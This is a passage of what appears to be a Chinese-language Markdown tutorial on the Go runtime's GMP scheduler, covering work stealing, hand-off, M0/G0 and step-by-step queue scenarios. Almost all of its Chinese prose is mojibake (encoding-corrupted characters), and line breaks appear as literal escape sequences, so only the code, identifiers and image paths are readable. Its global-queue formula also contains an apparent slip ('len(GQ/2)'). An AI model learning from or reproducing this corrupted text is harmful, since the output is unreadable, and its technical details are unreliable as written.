Mï¼Œæ‰€ä»¥ï¼Œå³ä½¿ P çš„é»˜è®¤æ•°é‡æ˜¯ 1ï¼Œä¹Ÿæœ‰å¯èƒ½ä¼šåˆ›å»ºå¾ˆå¤šä¸ª M å‡ºæ¥ã€‚\n\n### 3.3 P å’Œ M ä½•æ—¶ä¼šè¢«åˆ›å»º\n\n##### 1. P ä½•æ—¶åˆ›å»º\n\nåœ¨ç¡®å®šäº† P çš„æœ€å¤§æ•°é‡ n åï¼Œè¿è¡Œæ—¶ç³»ç»Ÿä¼šæ ¹æ®è¿™ä¸ªæ•°é‡åˆ›å»º n ä¸ª Pã€‚\n\n##### 2. M ä½•æ—¶åˆ›å»º\n\næ²¡æœ‰è¶³å¤Ÿçš„ M æ¥å…³è” P å¹¶è¿è¡Œå…¶ä¸­çš„å¯è¿è¡Œçš„ Gã€‚æ¯”å¦‚æ‰€æœ‰çš„ M æ­¤æ—¶éƒ½é˜»å¡ä½äº†ï¼Œè€Œ P ä¸­è¿˜æœ‰å¾ˆå¤šå°±ç»ªä»»åŠ¡ï¼Œå°±ä¼šå»å¯»æ‰¾ç©ºé—²çš„ Mï¼Œè€Œæ²¡æœ‰ç©ºé—²çš„ï¼Œå°±ä¼šå»åˆ›å»ºæ–°çš„ Mã€‚\n\n\n\n### 3.4  è°ƒåº¦å™¨çš„è®¾è®¡ç­–ç•¥\n\n##### 1. å¤ç”¨çº¿ç¨‹\n\né¿å…é¢‘ç¹çš„åˆ›å»ºã€é”€æ¯çº¿ç¨‹ï¼Œè€Œæ˜¯å¯¹çº¿ç¨‹çš„å¤ç”¨ã€‚\n\n+ work stealing æœºåˆ¶\n\n å½“æœ¬çº¿ç¨‹æ— å¯è¿è¡Œçš„ G æ—¶ï¼Œå°è¯•ä»å…¶ä»–çº¿ç¨‹ç»‘å®šçš„ P å·å– Gï¼Œè€Œä¸æ˜¯é”€æ¯çº¿ç¨‹ã€‚\n\n+ hand off æœºåˆ¶\n\n å½“æœ¬çº¿ç¨‹å› ä¸º G è¿›è¡Œç³»ç»Ÿè°ƒç”¨é˜»å¡æ—¶ï¼Œçº¿ç¨‹é‡Šæ”¾ç»‘å®šçš„ Pï¼ŒæŠŠ P è½¬ç§»ç»™å…¶ä»–ç©ºé—²çš„çº¿ç¨‹æ‰§è¡Œã€‚\n\n##### 2. åˆ©ç”¨å¹¶è¡Œ\n\nGOMAXPROCS è®¾ç½® P çš„æ•°é‡ï¼Œæœ€å¤šæœ‰ GOMAXPROCS ä¸ªçº¿ç¨‹åˆ†å¸ƒåœ¨å¤šä¸ª CPU ä¸ŠåŒæ—¶è¿è¡Œã€‚\n\nGOMAXPROCS ä¹Ÿé™åˆ¶äº†å¹¶å‘çš„ç¨‹åº¦ï¼Œæ¯”å¦‚ GOMAXPROCS = æ ¸æ•°/2ï¼Œåˆ™æœ€å¤šåˆ©ç”¨äº†ä¸€åŠçš„ CPU æ ¸è¿›è¡Œå¹¶è¡Œã€‚\n\n##### 3. æŠ¢å \n\nåœ¨ coroutine ä¸­è¦ç­‰å¾…ä¸€ä¸ªåç¨‹ä¸»åŠ¨è®©å‡º CPU æ‰æ‰§è¡Œä¸‹ä¸€ä¸ªåç¨‹ï¼Œåœ¨ Go ä¸­ï¼Œä¸€ä¸ª goroutine æœ€å¤šå ç”¨ CPU 10msï¼Œé˜²æ­¢å…¶ä»– goroutine è¢«é¥¿æ­»ã€‚\n\n##### 4. å…¨å±€ G é˜Ÿåˆ—\n\nåœ¨æ–°çš„è°ƒåº¦å™¨ä¸­ä¾ç„¶æœ‰å…¨å±€ G é˜Ÿåˆ—ï¼Œä½†åŠŸèƒ½å·²ç»è¢«å¼±åŒ–äº†ã€‚Må…ˆä»å…¨å±€ G é˜Ÿåˆ—è·å– Gã€‚å…¨å±€é˜Ÿåˆ—é‡Œæ²¡æœ‰ï¼Œå†ä»å…¶ä»–çš„Pçš„æœ¬åœ°é˜Ÿåˆ—ä¸­ååŠéƒ¨åˆ†å·å–ã€‚\n\n\n\n### 3.5 ä¸€ä¸ªgo func()çš„æµç¨‹\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/a4vWtvRWGQ.jpeg\" alt=\"18-go-funcè°ƒåº¦å‘¨æœŸ.jpeg\" style=\"zoom:67%;\" />\n\n\n\n 1ã€æˆ‘ä»¬é€šè¿‡ go func () æ¥åˆ›å»ºä¸€ä¸ª goroutineï¼›\n\n 2ã€æœ‰ä¸¤ä¸ªå­˜å‚¨ G çš„é˜Ÿåˆ—ï¼Œä¸€ä¸ªæ˜¯å±€éƒ¨è°ƒåº¦å™¨ P çš„æœ¬åœ°é˜Ÿåˆ—ã€ä¸€ä¸ªæ˜¯å…¨å±€ G é˜Ÿåˆ—ã€‚æ–°åˆ›å»ºçš„ G ä¼šå…ˆä¿å­˜åœ¨ P çš„æœ¬åœ°é˜Ÿåˆ—ä¸­ï¼Œå¦‚æœ P çš„æœ¬åœ°é˜Ÿåˆ—å·²ç»æ»¡äº†å°±ä¼šä¿å­˜åœ¨å…¨å±€çš„é˜Ÿåˆ—ä¸­ï¼›\n\n 3ã€G åªèƒ½è¿è¡Œåœ¨ M ä¸­ï¼Œæ‰§è¡Œä¸­çš„M ä¸ P æ˜¯ 1ï¼š1 çš„å…³ç³»ã€‚M ä¼šä» P çš„æœ¬åœ°é˜Ÿåˆ—å¼¹å‡ºä¸€ä¸ªå¯æ‰§è¡ŒçŠ¶æ€çš„ G æ¥æ‰§è¡Œï¼Œå¦‚æœ P çš„æœ¬åœ°é˜Ÿåˆ—ä¸ºç©ºï¼Œå°±ä¼šå‘å…¶ä»–çš„ MP ç»„åˆå·å–ä¸€åŠæˆ–å…¨å±€é˜Ÿåˆ—å¯æ‰§è¡Œçš„ G æ¥æ‰§è¡Œï¼›\n\n 4ã€ä¸€ä¸ª M è°ƒåº¦ G æ‰§è¡Œçš„è¿‡ç¨‹æ˜¯ä¸€ä¸ªå¾ªç¯æœºåˆ¶ï¼›\n\n 5ã€å½“ M æ‰§è¡ŒæŸä¸€ä¸ª G æ—¶å€™å¦‚æœå‘ç”Ÿäº† syscall æˆ–åˆ™å…¶ä½™é˜»å¡æ“ä½œï¼ŒM ä¼šé˜»å¡ï¼Œå¦‚æœå½“å‰æœ‰ä¸€äº› G åœ¨æ‰§è¡Œï¼Œruntime ä¼šæŠŠè¿™ä¸ªçº¿ç¨‹ M ä» P ä¸­æ‘˜é™¤ (detach)ï¼Œç„¶åå†åˆ›å»ºä¸€ä¸ªæ–°çš„æ“ä½œç³»ç»Ÿçš„çº¿ç¨‹ (å¦‚æœæœ‰ç©ºé—²çš„çº¿ç¨‹å¯ç”¨å°±å¤ç”¨ç©ºé—²çº¿ç¨‹) æ¥æœåŠ¡äºè¿™ä¸ª Pï¼›\n\n> è¿™ä¸ªMæ‹¿ç€è¿™ä¸ªGé˜»å¡ä¼‘çœ äº†ã€‚æŠŠPé˜Ÿåˆ—ï¼Œæ‰”ç»™åˆ«çš„Mäº†ã€‚\n\n 6ã€å½“ M ç³»ç»Ÿè°ƒç”¨ç»“æŸæ—¶å€™ï¼Œè¿™ä¸ª M ä¼šå°è¯•è·å–ä¸€ä¸ªç©ºé—²çš„ P æ‰§è¡Œï¼Œå¹¶æŠŠ G æ”¾å…¥åˆ°è¿™ä¸ª P çš„æœ¬åœ°é˜Ÿåˆ—ã€‚å¦‚æœè·å–ä¸åˆ° Pï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹ M å˜æˆä¼‘çœ çŠ¶æ€ï¼Œ åŠ å…¥åˆ°ç©ºé—²çº¿ç¨‹ä¸­ï¼Œç„¶åè¿™ä¸ª G ä¼šè¢«æ”¾å…¥å…¨å±€é˜Ÿåˆ—ä¸­ã€‚\n\n\n\n### 3.6 è°ƒåº¦å™¨çš„ç”Ÿå‘½å‘¨æœŸ\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/j37FX8nek9.png\" alt=\"j37FX8nek9\" style=\"zoom: 67%;\" />\n\n##### M0\n\nM0 æ˜¯å¯åŠ¨ç¨‹åºåçš„ç¼–å·ä¸º 0 çš„ä¸»çº¿ç¨‹ï¼Œè¿™ä¸ª M å¯¹åº”çš„å®ä¾‹ä¼šåœ¨å…¨å±€å˜é‡ runtime.m0 ä¸­ï¼Œä¸éœ€è¦åœ¨ heap ä¸Šåˆ†é…ï¼ŒM0 è´Ÿè´£æ‰§è¡Œåˆå§‹åŒ–æ“ä½œå’Œå¯åŠ¨ç¬¬ä¸€ä¸ª Gï¼Œ åœ¨ä¹‹å M0 å°±å’Œå…¶ä»–çš„ M ä¸€æ ·äº†ã€‚\n\n##### G0\n\nG0 æ˜¯æ¯æ¬¡å¯åŠ¨ä¸€ä¸ª M éƒ½ä¼šç¬¬ä¸€ä¸ªåˆ›å»ºçš„ goroutineï¼ŒG0 ä»…ç”¨äºè´Ÿè´£è°ƒåº¦çš„ Gï¼ŒG0 ä¸æŒ‡å‘ä»»ä½•å¯æ‰§è¡Œçš„å‡½æ•°ï¼Œæ¯ä¸ª M éƒ½ä¼šæœ‰ä¸€ä¸ªè‡ªå·±çš„ G0ã€‚åœ¨è°ƒåº¦æˆ–ç³»ç»Ÿè°ƒç”¨æ—¶ä¼šä½¿ç”¨ G0 çš„æ ˆç©ºé—´ï¼Œå…¨å±€å˜é‡çš„ G0 æ˜¯ M0 çš„ G0ã€‚\n\n##### ä»£ç åˆ†æ\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello world\")\n}\n```\n\n+ runtime åˆ›å»ºæœ€åˆçš„çº¿ç¨‹ m0 å’Œ goroutine g0ï¼Œå¹¶æŠŠ 2 è€…å…³è”ã€‚\n+ è°ƒåº¦å™¨åˆå§‹åŒ–ï¼šåˆå§‹åŒ– m0ã€æ ˆã€åƒåœ¾å›æ”¶ï¼Œä»¥åŠåˆ›å»ºå’Œåˆå§‹åŒ–ç”± GOMAXPROCS ä¸ª P æ„æˆçš„ P åˆ—è¡¨ã€‚\n+ ç¤ºä¾‹ä»£ç ä¸­çš„ main å‡½æ•°æ˜¯ main.mainï¼Œruntime ä¸­ä¹Ÿæœ‰ 1 ä¸ª main å‡½æ•° â€”â€”runtime.mainï¼Œä»£ç ç»è¿‡ç¼–è¯‘åï¼Œruntime.main ä¼šè°ƒç”¨ main.mainï¼Œç¨‹åºå¯åŠ¨æ—¶ä¼šä¸º runtime.main åˆ›å»º goroutineï¼Œç§°å®ƒä¸º main goroutine å§ï¼Œç„¶åæŠŠ main goroutine åŠ å…¥åˆ° P çš„æœ¬åœ°é˜Ÿåˆ—ã€‚\n+ å¯åŠ¨ m0ï¼Œm0 å·²ç»ç»‘å®šäº† Pï¼Œä¼šä» P çš„æœ¬åœ°é˜Ÿåˆ—è·å– Gï¼Œè·å–åˆ° main goroutineã€‚\n+ G æ‹¥æœ‰æ ˆï¼ŒM æ ¹æ® G ä¸­çš„æ ˆä¿¡æ¯å’Œè°ƒåº¦ä¿¡æ¯è®¾ç½®è¿è¡Œç¯å¢ƒ\n+ M è¿è¡Œ G\n+ G é€€å‡ºï¼Œå†æ¬¡å›åˆ° M è·å–å¯è¿è¡Œçš„ Gï¼Œè¿™æ ·é‡å¤ä¸‹å»ï¼Œç›´åˆ° main.main é€€å‡ºï¼Œruntime.main æ‰§è¡Œ Defer å’Œ Panic å¤„ç†ï¼Œæˆ–è°ƒç”¨ runtime.exit é€€å‡ºç¨‹åºã€‚\n+ è°ƒåº¦å™¨çš„ç”Ÿå‘½å‘¨æœŸå‡ ä¹å æ»¡äº†ä¸€ä¸ª Go ç¨‹åºçš„ä¸€ç”Ÿï¼Œruntime.main çš„ goroutine æ‰§è¡Œä¹‹å‰éƒ½æ˜¯ä¸ºè°ƒåº¦å™¨åšå‡†å¤‡å·¥ä½œï¼Œruntime.main çš„ goroutine è¿è¡Œï¼Œæ‰æ˜¯è°ƒåº¦å™¨çš„çœŸæ­£å¼€å§‹ï¼Œç›´åˆ° runtime.main ç»“æŸè€Œç»“æŸã€‚\n\n\n\n# 4. åœºæ™¯è§£æ\n\n### 4.1 åˆ›å»ºæ–°goroutine\n\nP æ‹¥æœ‰ G1ï¼ŒM1 è·å– P åå¼€å§‹è¿è¡Œ G1ï¼ŒG1 ä½¿ç”¨ `go func()` åˆ›å»ºäº† G2ï¼Œä¸ºäº†å±€éƒ¨æ€§ G2 ä¼˜å…ˆåŠ å…¥åˆ° P1 çš„æœ¬åœ°é˜Ÿåˆ—ã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/Pm8LOYcsWQ.png\" alt=\"Pm8LOYcsWQ\" style=\"zoom:50%;\" />\n\n### 4.2 çº¿ç¨‹æ‰§è¡ŒPçš„é˜Ÿåˆ—\n\nG1 è¿è¡Œå®Œæˆå (å‡½æ•°ï¼šgoexit)ï¼ŒM ä¸Šè¿è¡Œçš„ goroutine åˆ‡æ¢ä¸º G0ï¼ŒG0 è´Ÿè´£è°ƒåº¦æ—¶åç¨‹çš„åˆ‡æ¢ï¼ˆå‡½æ•°ï¼šscheduleï¼‰ã€‚ä» P çš„æœ¬åœ°é˜Ÿåˆ—å– G2ï¼Œä» G0 åˆ‡æ¢åˆ° G2ï¼Œå¹¶å¼€å§‹è¿è¡Œ G2 (å‡½æ•°ï¼šexecute)ã€‚å®ç°äº†çº¿ç¨‹ M1 çš„å¤ç”¨ã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/JWDtmKG3rK.png\" alt=\"27-gmpåœºæ™¯2.png\" style=\"zoom:50%;\" />\n\n### 4.3 Pçš„é˜Ÿåˆ—æ»¡çš„æ—¶å€™\n\nå‡è®¾æ¯ä¸ª P çš„æœ¬åœ°é˜Ÿåˆ—åªèƒ½å­˜ 3 ä¸ª Gã€‚G2 è¦åˆ›å»ºäº† 6 ä¸ª Gï¼Œå‰ 4 ä¸ª Gï¼ˆG3, G4, G5,G6ï¼‰å·²ç»åŠ å…¥ p1 çš„æœ¬åœ°é˜Ÿåˆ—ï¼Œp1 æœ¬åœ°é˜Ÿåˆ—æ»¡äº†ã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/UpjRxzIBd3.png\" alt=\"28-gmpåœºæ™¯3.png\" style=\"zoom:50%;\" />\n\nG2 åœ¨åˆ›å»º G7 çš„æ—¶å€™ï¼Œå‘ç° P1 çš„æœ¬åœ°é˜Ÿåˆ—å·²æ»¡ï¼Œéœ€è¦æ‰§è¡Œ**è´Ÿè½½å‡è¡¡** (æŠŠ P1 ä¸­æœ¬åœ°é˜Ÿåˆ—ä¸­å‰ä¸€åŠçš„ Gï¼Œè¿˜æœ‰æ–°åˆ›å»º G **è½¬ç§»**åˆ°å…¨å±€é˜Ÿåˆ—)\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/chqTgsiuWi.png\" alt=\"29-gmpåœºæ™¯4.png\" style=\"zoom:50%;\" />\n\nè¿™äº› G è¢«è½¬ç§»åˆ°å…¨å±€é˜Ÿåˆ—æ—¶ï¼Œä¼šè¢«æ‰“ä¹±é¡ºåºã€‚æ‰€ä»¥ G3,G4,G7 è¢«è½¬ç§»åˆ°å…¨å±€é˜Ÿåˆ—ã€‚\n\n\n\n### 4.4  Pçš„é˜Ÿåˆ—ç»§ç»­åˆ›å»ºgorutine\n\nG2 åˆ›å»º G8 æ—¶ï¼ŒP1 çš„æœ¬åœ°é˜Ÿåˆ—æœªæ»¡ï¼Œæ‰€ä»¥ G8 ä¼šè¢«åŠ å…¥åˆ° P1 çš„æœ¬åœ°é˜Ÿåˆ—ã€‚G8 åŠ å…¥åˆ° P1 ç‚¹æœ¬åœ°é˜Ÿåˆ—çš„åŸå› è¿˜æ˜¯å› ä¸º P1 æ­¤æ—¶åœ¨ä¸ M1 ç»‘å®šï¼Œè€Œ G2 æ­¤æ—¶æ˜¯ M1 åœ¨æ‰§è¡Œã€‚æ‰€ä»¥ G2 åˆ›å»ºçš„æ–°çš„ G ä¼šä¼˜å…ˆæ”¾ç½®åˆ°è‡ªå·±çš„ M ç»‘å®šçš„ P ä¸Šã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/nukEY92G6D.png\" alt=\"30-gmpåœºæ™¯5.png\" style=\"zoom:50%;\" />\n\n### 4.5 åˆ›å»ºGotutineæ—¶ï¼Œå”¤é†’å…¶ä»–çš„På’ŒM\n\nåœ¨åˆ›å»º G æ—¶ï¼Œè¿è¡Œçš„ G ä¼šå°è¯•å”¤é†’å…¶ä»–ç©ºé—²çš„ P å’Œ M ç»„åˆå»æ‰§è¡Œã€‚å‡å®š G2 å”¤é†’äº† M2ï¼ŒM2 ç»‘å®šäº† P2ï¼Œå¹¶è¿è¡Œ G0ï¼Œä½† P2 æœ¬åœ°é˜Ÿåˆ—æ²¡æœ‰ Gï¼ŒM2 æ­¤æ—¶ä¸ºè‡ªæ—‹çº¿ç¨‹ï¼ˆæ²¡æœ‰ G ä½†ä¸ºè¿è¡ŒçŠ¶æ€çš„çº¿ç¨‹ï¼Œä¸æ–­å¯»æ‰¾ Gï¼‰ã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/2FWNXSuHfX.png\" alt=\"31-gmpåœºæ™¯6.png\" style=\"zoom:50%;\" />\n\n### 4.6 Mä»å…¨å±€é˜Ÿåˆ—æ‹¿G\n\nM2 å°è¯•ä»å…¨å±€é˜Ÿåˆ— (ç®€ç§° â€œGQâ€) å–ä¸€æ‰¹ G æ”¾åˆ° P2 çš„æœ¬åœ°é˜Ÿåˆ—ï¼ˆå‡½æ•°ï¼š`findrunnable()`ï¼‰ã€‚M2 ä»å…¨å±€é˜Ÿåˆ—å–çš„ G æ•°é‡ç¬¦åˆä¸‹é¢çš„å…¬å¼ï¼š\n\n```bash\nn = min(len(GQ)/GOMAXPROCS + 1, len(GQ/2))\n```\n\nè‡³å°‘ä»å…¨å±€é˜Ÿåˆ—å– 1 ä¸ª gï¼Œä½†æ¯æ¬¡ä¸è¦ä»å…¨å±€é˜Ÿåˆ—ç§»åŠ¨å¤ªå¤šçš„ g åˆ° p æœ¬åœ°é˜Ÿåˆ—ï¼Œç»™å…¶ä»– p ç•™ç‚¹ã€‚è¿™æ˜¯ä»å…¨å±€é˜Ÿåˆ—åˆ° P æœ¬åœ°é˜Ÿåˆ—çš„è´Ÿè½½å‡è¡¡ã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/0fn8DGqI8N.jpeg\" alt=\"32-gmpåœºæ™¯7.001.jpeg\" style=\"zoom: 67%;\" />\n\nå‡å®šæˆ‘ä»¬åœºæ™¯ä¸­ä¸€å…±æœ‰ 4 ä¸ª Pï¼ˆGOMAXPROCS è®¾ç½®ä¸º 4ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…è®¸æœ€å¤šå°±èƒ½ç”¨ 4 ä¸ª P æ¥ä¾› M ä½¿ç”¨ï¼‰ã€‚æ‰€ä»¥ M2 åªä»èƒ½ä»å…¨å±€é˜Ÿåˆ—å– 1 ä¸ª Gï¼ˆå³ G3ï¼‰ç§»åŠ¨ P2 æœ¬åœ°é˜Ÿåˆ—ï¼Œç„¶åå®Œæˆä» G0 åˆ° G3 çš„åˆ‡æ¢ï¼Œè¿è¡Œ G3ã€‚\n\n### 4.7 Må·å–åˆ«çš„Mçš„G\n\nå‡è®¾ G2 ä¸€ç›´åœ¨ M1 ä¸Šè¿è¡Œï¼Œç»è¿‡ 2 è½®åï¼ŒM2 å·²ç»æŠŠ G7ã€G4 ä»å…¨å±€é˜Ÿåˆ—è·å–åˆ°äº† P2 çš„æœ¬åœ°é˜Ÿåˆ—å¹¶å®Œæˆè¿è¡Œï¼Œå…¨å±€é˜Ÿåˆ—å’Œ P2 çš„æœ¬åœ°é˜Ÿåˆ—éƒ½ç©ºäº†ï¼Œå¦‚åœºæ™¯ 8 å›¾çš„å·¦åŠéƒ¨åˆ†ã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/qn1NRMLqnp.png\" alt=\"33-gmpåœºæ™¯8.png\" style=\"zoom:67%;\" />\n\nå…¨å±€é˜Ÿåˆ—å·²ç»æ²¡æœ‰ Gï¼Œé‚£ m å°±è¦æ‰§è¡Œ work stealing (å·å–)ï¼šä»å…¶ä»–æœ‰ G çš„ P å“ªé‡Œå·å–ä¸€åŠ G è¿‡æ¥ï¼Œæ”¾åˆ°è‡ªå·±çš„ P æœ¬åœ°é˜Ÿåˆ—ã€‚P2 ä» P1 çš„æœ¬åœ°é˜Ÿåˆ—å°¾éƒ¨å–ä¸€åŠçš„ Gï¼Œæœ¬ä¾‹ä¸­ä¸€åŠåˆ™åªæœ‰ 1 ä¸ª G8ï¼Œæ”¾åˆ° P2 çš„æœ¬åœ°é˜Ÿåˆ—å¹¶æ‰§è¡Œã€‚\n\n\n\n### 4.8 è‡ªæ—‹çº¿ç¨‹M\n\nG1 æœ¬åœ°é˜Ÿåˆ— G5ã€G6 å·²ç»è¢«å…¶ä»– M å·èµ°å¹¶è¿è¡Œå®Œæˆï¼Œå½“å‰ M1 å’Œ M2 åˆ†åˆ«åœ¨è¿è¡Œ G2 å’Œ G8ï¼ŒM3 å’Œ M4 æ²¡æœ‰ goroutine å¯ä»¥è¿è¡Œï¼ŒM3 å’Œ M4 å¤„äºè‡ªæ—‹çŠ¶æ€ï¼Œå®ƒä»¬ä¸æ–­å¯»æ‰¾ goroutineã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/1DjlseEGTT.png\" alt=\"34-gmpåœºæ™¯9.png\" style=\"zoom:67%;\" />\n\nä¸ºä»€ä¹ˆè¦è®© m3 å’Œ m4 è‡ªæ—‹ï¼Œè‡ªæ—‹æœ¬è´¨æ˜¯åœ¨è¿è¡Œï¼Œçº¿ç¨‹åœ¨è¿è¡Œå´æ²¡æœ‰æ‰§è¡Œ Gï¼Œå°±å˜æˆäº†æµªè´¹ CPU. ä¸ºä»€ä¹ˆä¸é”€æ¯ç°åœºï¼Œæ¥èŠ‚çº¦ CPU èµ„æºã€‚å› ä¸ºåˆ›å»ºå’Œé”€æ¯ CPU ä¹Ÿä¼šæµªè´¹æ—¶é—´ï¼Œæˆ‘ä»¬å¸Œæœ›å½“æœ‰æ–° goroutine åˆ›å»ºæ—¶ï¼Œç«‹åˆ»èƒ½æœ‰ M è¿è¡Œå®ƒï¼Œå¦‚æœé”€æ¯å†æ–°å»ºå°±å¢åŠ äº†æ—¶å»¶ï¼Œé™ä½äº†æ•ˆç‡ã€‚å½“ç„¶ä¹Ÿè€ƒè™‘äº†è¿‡å¤šçš„è‡ªæ—‹çº¿ç¨‹æ˜¯æµªè´¹ CPUï¼Œæ‰€ä»¥ç³»ç»Ÿä¸­æœ€å¤šæœ‰ GOMAXPROCS ä¸ªè‡ªæ—‹çš„çº¿ç¨‹ (å½“å‰ä¾‹å­ä¸­çš„ GOMAXPROCS=4ï¼Œæ‰€ä»¥ä¸€å…± 4 ä¸ª P)ï¼Œå¤šä½™çš„æ²¡äº‹åšçº¿ç¨‹ä¼šè®©ä»–ä»¬ä¼‘çœ ã€‚\n\n\n\n### 4.9 Mé˜»å¡åè§£ç»‘Pï¼ŒPæ‰¾å…¶ä»–Mç»„åˆã€‚\n\nå‡å®šå½“å‰é™¤äº† M3 å’Œ M4 ä¸ºè‡ªæ—‹çº¿ç¨‹ï¼Œè¿˜æœ‰ M5 å’Œ M6 ä¸ºç©ºé—²çš„çº¿ç¨‹ (æ²¡æœ‰å¾—åˆ° P çš„ç»‘å®šï¼Œæ³¨æ„æˆ‘ä»¬è¿™é‡Œæœ€å¤šå°±åªèƒ½å¤Ÿå­˜åœ¨ 4 ä¸ª Pï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ M>=P, å¤§éƒ¨åˆ†éƒ½æ˜¯ M åœ¨æŠ¢å éœ€è¦è¿è¡Œçš„ P)ã€‚\n\nG8 åˆ›å»ºäº† G9ï¼ŒG8 è¿›è¡Œäº†é˜»å¡çš„ç³»ç»Ÿè°ƒç”¨ï¼ŒM2 å’Œ P2 ç«‹å³è§£ç»‘ã€‚\n\nP2 ä¼šæ‰§è¡Œä»¥ä¸‹åˆ¤æ–­ï¼šå¦‚æœ P2 æœ¬åœ°é˜Ÿåˆ—æœ‰ Gã€å…¨å±€é˜Ÿåˆ—æœ‰ G æˆ–æœ‰ç©ºé—²çš„ Mï¼ŒP2 éƒ½ä¼šç«‹é©¬å”¤é†’ 1 ä¸ª M å’Œå®ƒç»‘å®šï¼Œå¦åˆ™ P2 åˆ™ä¼šåŠ å…¥åˆ°ç©ºé—² P åˆ—è¡¨ï¼Œç­‰å¾… M æ¥è·å–å¯ç”¨çš„ pã€‚\n\næœ¬åœºæ™¯ä¸­ï¼ŒP2 æœ¬åœ°é˜Ÿåˆ—æœ‰ G9ï¼Œå¯ä»¥å’Œå…¶ä»–ç©ºé—²çš„çº¿ç¨‹ M5 ç»‘å®šã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/k3HKE9U21M.png\" alt=\"35-gmpåœºæ™¯10.png\" style=\"zoom:67%;\" />\n\n\n\n### 4.10 Må”¤é†’åå…ˆæ‰¾Pï¼Œæ‰¾ä¸åˆ°Må»ä¼‘çœ ï¼ŒGå»å…¨å±€ã€‚\n\nG8 åˆ›å»ºäº† G9ï¼Œå‡å¦‚ G8 è¿›è¡Œäº†éé˜»å¡ç³»ç»Ÿè°ƒç”¨ã€‚\n\nM2 å’Œ P2 ä¼šè§£ç»‘ï¼Œä½† M2 ä¼šè®°ä½ P2ï¼Œç„¶å G8 å’Œ M2 è¿›å…¥ç³»ç»Ÿè°ƒç”¨çŠ¶æ€ã€‚å½“ G8 å’Œ M2 é€€å‡ºç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¼šå°è¯•è·å– P2ï¼Œå¦‚æœæ— æ³•è·å–ï¼Œåˆ™è·å–ç©ºé—²çš„ Pï¼Œå¦‚æœä¾ç„¶æ²¡æœ‰ï¼ŒG8 ä¼šè¢«è®°ä¸ºå¯è¿è¡ŒçŠ¶æ€ï¼Œå¹¶åŠ å…¥åˆ°å…¨å±€é˜Ÿåˆ—ï¼ŒM2 å› ä¸ºæ²¡æœ‰ P çš„ç»‘å®šè€Œå˜æˆä¼‘çœ çŠ¶æ€ (é•¿æ—¶é—´ä¼‘çœ ç­‰å¾… GC å›æ”¶é”€æ¯)ã€‚\n\n\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/zBvpl8ENSb.png\" alt=\"36-gmpåœºæ™¯11.png\" style=\"zoom:67%;\" />\n\n# 5. å¤´è„‘é£æš´\n\n### 5.1 ioå¯†é›†ä»»åŠ¡ï¼Œ å¢å¤§GOMAXPROCSæœ‰æ•ˆå—?\n\næœ‰æ•ˆã€‚å‚è€ƒï¼šhttps://colobu.com/2017/10/11/interesting-things-about-GOMAXPROCS/\n\nGo è¿è¡Œæ—¶å¹¶è¡Œæ‰§è¡Œçš„ goroutines æ•°é‡æ˜¯å°äºç­‰äº P çš„æ•°é‡çš„ï¼Œå¦‚æœä¸€ä¸ªæŒæœ‰ P çš„ Mï¼Œç”±äº P å½“å‰æ‰§è¡Œçš„ G è°ƒç”¨äº† syscall è€Œå¯¼è‡´ M è¢«é˜»å¡ï¼Œè°ƒåº¦å™¨ç›¸å¯¹è¿Ÿé’ï¼Œå¾ˆå¯èƒ½ç›´åˆ° M é˜»å¡ä¸€å®šæ—¶é—´åæ‰å‘ç°è¢«é˜»å¡äº†ï¼Œç„¶åæ‰ç”¨ç©ºé—²çš„ M æ¥æŠ¢è¿™ä¸ª Pã€‚\n\né€šè¿‡å°†`GOMAXPROCS`è®¾ç½®æ›´å¤§çš„æ•°(64/128, æ•°å€CPUæ ¸æ•°), ä¼šæé«˜I/Oçš„ååç‡ã€‚\n\n### 5.2 GMP æ¨¡å‹ï¼Œä¸ºä»€ä¹ˆè¦æœ‰ Pï¼Ÿ\n\nåœ¨ Go1.1 ä¹‹å‰ Go çš„è°ƒåº¦æ¨¡å‹å…¶å®å°±æ˜¯ GM æ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰ Pã€‚\n\n+ åˆ›å»ºã€é”€æ¯ã€è°ƒåº¦ G éƒ½éœ€è¦æ¯ä¸ª M è·å–é”ï¼Œè¿™å°±å½¢æˆäº†æ¿€çƒˆçš„é”ç«äº‰ã€‚\n+ M è½¬ç§» G ä¼šé€ æˆå»¶è¿Ÿå’Œé¢å¤–çš„ç³»ç»Ÿè´Ÿè½½ã€‚æ¯”å¦‚å½“ G ä¸­åŒ…å«åˆ›å»ºæ–°åç¨‹çš„æ—¶å€™ï¼ŒM åˆ›å»ºäº† Gâ€™ï¼Œä¸ºäº†ç»§ç»­æ‰§è¡Œ Gï¼Œéœ€è¦æŠŠ Gâ€™äº¤ç»™Mâ€™æ‰§è¡Œï¼Œä¹Ÿé€ æˆäº†å¾ˆå·®çš„å±€éƒ¨æ€§ï¼Œå› ä¸º Gâ€™å’Œ G æ˜¯ç›¸å…³çš„ï¼Œæœ€å¥½æ”¾åœ¨ M ä¸Šæ‰§è¡Œï¼Œè€Œä¸æ˜¯å…¶ä»– Mâ€™ã€‚\n+ ç³»ç»Ÿè°ƒç”¨ (CPU åœ¨ M ä¹‹é—´çš„åˆ‡æ¢) å¯¼è‡´é¢‘ç¹çš„çº¿ç¨‹é˜»å¡å’Œå–æ¶ˆé˜»å¡æ“ä½œå¢åŠ äº†ç³»ç»Ÿå¼€é”€ã€‚\n\n**åŠ äº†Pä»¥å**\n\n+ 